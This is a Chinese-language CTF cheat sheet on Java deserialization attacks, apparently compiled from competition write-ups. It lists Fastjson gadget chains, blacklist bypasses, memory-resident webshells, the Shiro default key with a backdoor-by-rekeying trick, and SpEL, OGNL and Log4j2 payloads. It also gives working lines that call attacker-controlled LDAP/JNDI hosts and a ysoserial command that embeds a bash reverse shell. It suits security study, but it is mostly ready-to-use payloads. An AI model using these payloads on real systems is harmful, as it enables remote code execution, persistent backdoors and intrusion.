# 07-Java反序列化

## 总览

> **通路**: ① 直接执行 / ④ 内存马\
> **来源**: 1156 篇 WP 提炼（仓库无专文，全部来自实战案例）+ 网络补充

***

## 一、Fastjson 各版本链 ★

| 版本 / 场景 | 利用链 | 出处 |
| --- | --- | --- |
| **< 1.2.83** | `JdbcRowSetImpl` + `autoCommit` 触发 JNDI lookup | `2022虎符CTF-Java部分.meta.md:8` |
| **1.2.15** | CC3 / CC4 / ROME / SnakeYAML gadget + **本地回显** | `2022台州市赛AWD.meta.md:62` |
| **西湖论剑** | `HotSwappableTargetSource(JSONArray(TemplatesImpl))` 链 | `2023西湖论剑web.meta.md:49` |
| **1.2.80 (CVE-2022-25845)** | 双 `@type` 报错缓存 → `$ref` 二次取 OutputStream → 写 `/etc/crontab` | `2025京麒CTF.meta.md:11-13` |

### 1.1 JdbcRowSetImpl 基础 payload

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
```

### 1.2 西湖论剑链（TemplatesImpl）

```plain
HotSwappableTargetSource(JSONArray(TemplatesImpl))
  → equals → XString.equals → toString
  → TemplatesImpl.getOutputProperties()
  → 加载恶意 _bytecodes[0]（继承 AbstractTranslet，static 块弹 shell）
```

### 1.3 1.2.80 链（写 crontab）

```plain
双 @type 触发 JsonGenerationException 缓存 UTF8JsonGenerator
→ $ref 二次取 OutputStream
→ MarshalOutputStream + InflaterOutputStream + 自定义 FilterFileOutputStream
→ 写 /etc/crontab → root 反弹 shell
```

### 1.4 BCEL 字节码（内网 fastjson）

```json
{"@type":"org.apache.xalan.xsltc.trax.TemplatesImpl","_bytecodes":["$$BCEL$$..."]}
```

出处: `祥云杯-WriteUp.meta.md:9`

***

## 二、黑名单绕过 gadget 链

### 2.1 CommonsBeanutils 反射链

**封杀** `JdbcRowSetImpl / TemplatesImpl / SignedObject / Runtime / ProcessBuilder / PriorityQueue`

```plain
BadAttributeValueExpException.readObject
  → TiedMapEntry.toString
  → LazyMap.get
  → BeanComparator.compare
  → PropertyUtilsBean.getProperty
  → Method.invoke
```

出处: `2023安洵杯.meta.md:39-52`

### 2.2 Vaadin 链

**封杀** `TemplatesImpl|JdbcRowSetImpl|Jndi|BadAttributeValueExpException`（含 hex 变体）

```plain
NestedMethodProperty + PropertysetItem + MyBean
  → MyBean.getConnection
  → JdbcRowSetImpl
  → MySQL JDBC 读文件
```

出处: `2023黑盾杯.meta.md:20-23`

***

## 三、内存马（无文件落地）★★ 现代主流

| 类型 | 手法 | 出处 |
| --- | --- | --- |
| **Spring Controller** | 反射注册 `RequestMappingHandlerMapping.registerMapping(info, ctrl, method)` → 注册 `/yang99` controller | `DASCTF×CBCTF2022.meta.md:35-49` |
| **XSLT** | 反序列化 XSLT payload → `TemplatesImpl` 内存马 | `2025强网杯.meta.md:28` |
| **Tomcat** | CC2 + Tomcat Filter / Servlet / Listener / Valve | 网络补充 |
| **JDK17** | `TemplatesImpl + POJONode + EventListenerList + UndoManager` | `2025广西决赛.meta.md:111` |
| **Jackson** | `POJONode + BadAttributeValueExpException + TemplatesImpl` | `上海大学生赛.meta.md:62` |
| **FastAPI (Python)** | SSTI → `add_api_route` 内存马 | `2024巅峰极客.meta.md:16` |

**内存马特点**:

* 无文件落地（不写 JSP）
* 重启前一直有效
* `Runtime.exec` 回显
* 冰蝎 / 哥斯拉连接

**Spring Controller 内存马核心代码**:

```java
// 反射获取 RequestMappingHandlerMapping
mappingHandlerMapping.registerMapping(info, injectToController, method2);
// cmd 走 /bin/sh -c
```

出处: `DASCTF×CBCTF2022.meta.md:35-49`、`MRCTF2022后记.meta.md:12`

***

## 四、Shiro

```plain
# 默认 key
kPH+bIxk5D2deZiIxcaaaA==

# Cookie
Cookie: rememberMe_rwctf_2024=<base64>

# 链: CommonsBeanutils
```

工具: `shiro_attack.py`、`ShiroExploit`\
出处: `RWCTF2024.meta.md:35-40`、`2024中国工互.meta.md:55`

### AWD 冷补丁留后门（反向利用）

```plain
改 ShiroConfig.java 密钥 → CFR 反编译 → javac 重编译 → jar -cvfM0 重打包
# 把自己的 key 写进去留后门
```

出处: `AWD离线-Jar文件冷补丁.meta.md:52-66`

***

## 五、Spring 系

| 漏洞 | Payload | 出处 |
| --- | --- | --- |
| **SpEL (CVE-2022-22963)** | `spring.cloud.function.routing-expression=T(java.lang.Runtime).getRuntime().exec("id")` | `2022虎符CTF:65` |
| **Spring Hessian** | `Maybe(InvocationHandler) + ObjectFactory` → JNDI | `RCTF2025.meta.md:11-13` |
| **SpEL 绕沙箱** | `[[${T(java.lang.Boolean).forName("...SpelExpressionParser").newInstance().parseExpression("T(Runtime).getRuntime().exec('calc')").getValue()}]]` | `2024红明谷.meta.md:39` |
| **Spring 路径穿越** | `10.10.1.11:8080/xxxx/..;/admin/test` | `祥云杯.meta.md:9` |

***

## 六、Struts2 / OGNL

```java
// OGNL 反射 + 双重 URL 编码绕 WAF
#a.getClass().forName("java.lang.Runtime")
```

出处: `2023阿里云CTF.meta.md:16`

**S2-061**: `org.apache.tomcat.InstanceManager` + Jackson `enableDefaultTyping` + `constructFromCanonical` + MLet 远程加载恶意 class\
出处: `ssti挑战——wp.meta.md:17`

***

## 七、Log4j2

```plain
${jndi:ldap://attacker.com/Exploit}
${j${::-n}di:${::-l}dap://...}      # 拆关键字绕字符串检查
```

出处: `2022虎符CTF:59`、`RWCTF体验赛.meta.md:19`

***

## 八、其它 Java 框架

| 组件 | 手法 | 出处 |
| --- | --- | --- |
| **Ofbiz** | `groovyProgram` 沙箱 RCE | `RWCTF2024.meta.md:11` |
| **ActiveMQ** | OpenWire `ClassPathXmlApplicationContext` 触发 Spring XML RCE | `RWCTF2024.meta.md:11` |
| **Liferay** | CVE-2019-16891 未授权：`hibernate sessionFactoryJNDIName = ldap://attacker` | `TetCTF2023.meta.md:21` |
| **WebLogic** | T3 / IIOP 反序列化 | 网络补充 |
| **H2 Database** | `CREATE ALIAS SHELLEXEC AS $$ ... $$` 执行系统命令 | `RWCTF体验赛.meta.md:25` |
| **XXL-JOB** | Hessian 反序列化 | 网络补充 |

***

## 九、工具清单

| 工具 | 用途 |
| --- | --- |
| `ysoserial` / `ysoserial-all` | 通用反序列化 payload 生成 |
| `JNDI-Exploit-Kit` / `su18` | JNDI 注入 |
| `marshalsec` | 起 LDAP/RMI 服务 |
| `shiro_attack.py` / `ShiroExploit` | Shiro 一键 |
| `CFR + javac + jar` | AWD 冷补丁重打包 |

### 常用命令

```bash
# CC2 打 runtime 4.4
java -jar ysoserial-all.jar CommonsCollections2 "bash -c {echo,<base64>}|{base64,-d}|{bash,-i}" > payload.ser

# JNDI
java -jar JNDIExploit.jar -i attacker_ip
```

出处: `2024能源赛.meta.md:62`
